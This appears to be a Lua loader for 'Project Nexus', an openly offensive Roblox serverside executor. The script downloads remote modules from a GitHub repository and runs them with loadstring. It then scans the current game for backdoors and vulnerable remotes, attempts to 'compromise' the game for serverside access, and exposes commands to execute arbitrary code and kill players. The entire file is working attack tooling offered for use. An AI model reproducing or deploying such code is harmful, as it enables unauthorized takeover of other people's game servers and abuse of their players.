--[[
    Project Nexus - Quick Loader V2 (Standalone)
    No C&C server required - direct execution
]]

local function loadNexus()
    print([[
    ╔═══════════════════════════════════════════════╗
    ║          PROJECT NEXUS v1.0                    ║
    ║     Advanced FE Serverside Executor            ║
    ║             STANDALONE MODE                    ║
    ╚═══════════════════════════════════════════════╝
    ]])
    
    -- Configuration
    local GITHUB_REPO = "HyperCodez495/ProjectNexus-Roblox-Script"
    local GITHUB_BRANCH = "main"
    local GITHUB_BASE = string.format("https://raw.githubusercontent.com/%s/%s/", GITHUB_REPO, GITHUB_BRANCH)
    
    -- Load main module (with cache buster)
    print("[NEXUS] Loading from GitHub...")
    local cacheBuster = "?cb=" .. tostring(math.random(1000000, 9999999))
    
    local success, Nexus = pcall(function()
        return loadstring(game:HttpGet(GITHUB_BASE .. "main.lua" .. cacheBuster))()
    end)
    
    if not success then
        warn("[NEXUS] Failed to load main module: " .. tostring(Nexus))
        return
    end
    
    if not Nexus then
        warn("[NEXUS] Main module returned nil")
        return
    end
    
    print("[NEXUS] Main module loaded successfully!")
    
    -- Create instance WITHOUT initializing connection
    local instance = Nexus.new({
        commandServer = "http://localhost:8080",  -- Not used in standalone
        autoScan = false,  -- We'll do this manually
        persistentMode = true
    })
    
    print("[NEXUS] Instance created in standalone mode")
    print("[NEXUS] No C&C server required - direct control via _G.NexusInstance")
    print("")
    
    -- Manual scan
    print("[NEXUS] Scanning current game for vulnerabilities...")
    local scanResults = instance:ScanCurrentGame()
    
    if scanResults then
        print(string.format("[NEXUS] Scan complete - Rating: %s (Score: %d)", 
            scanResults.rating, scanResults.score))
        print(string.format("  • Backdoors found: %d", #scanResults.backdoors))
        print(string.format("  • Vulnerable remotes: %d", #scanResults.remotes))
        print(string.format("  • Suspicious scripts: %d", #scanResults.suspiciousScripts))
    end
    
    print("")
    
    -- Try to compromise
    spawn(function()
        wait(2)
        print("[NEXUS] Attempting to compromise game...")
        local compromised = instance:Compromise()
        
        if compromised then
            print("[NEXUS] ✓ Game successfully compromised!")
            print("[NEXUS] ✓ Serverside access established")
            
            -- Load GUI
            print("[NEXUS] Loading control GUI...")
            local guiSuccess, GUI = pcall(function()
                return loadstring(game:HttpGet(GITHUB_BASE .. "client/gui.lua" .. cacheBuster))()
            end)
            
            if guiSuccess and GUI then
                local gui = GUI.new()
                gui:Create()
                print("[NEXUS] ✓ GUI loaded - Press Right Shift to toggle")
                
                -- Toggle keybind
                game:GetService("UserInputService").InputBegan:Connect(function(input)
                    if input.KeyCode == Enum.KeyCode.RightShift then
                        gui:Toggle()
                    end
                end)
            else
                warn("[NEXUS] Failed to load GUI: " .. tostring(GUI))
            end
        else
            warn("[NEXUS] ✗ Compromise failed - no exploitable vectors found")
            print("[NEXUS] This game may be secured or have no vulnerabilities")
        end
    end)
    
    -- Export to global
    _G.Nexus = Nexus
    _G.NexusInstance = instance
    
    print("")
    print("[NEXUS] ══════════════════════════════════════")
    print("[NEXUS] Access via: _G.NexusInstance")
    print("[NEXUS] ")
    print("[NEXUS] Commands:")
    print("[NEXUS]   _G.NexusInstance:Execute([[code]])")
    print("[NEXUS]   _G.NexusInstance:Command('kill', 'player')")
    print("[NEXUS]   _G.NexusInstance:ScanCurrentGame()")
    print("[NEXUS]   _G.NexusInstance:Compromise()")
    print("[NEXUS] ══════════════════════════════════════")
    
    return instance
end

return loadNexus()
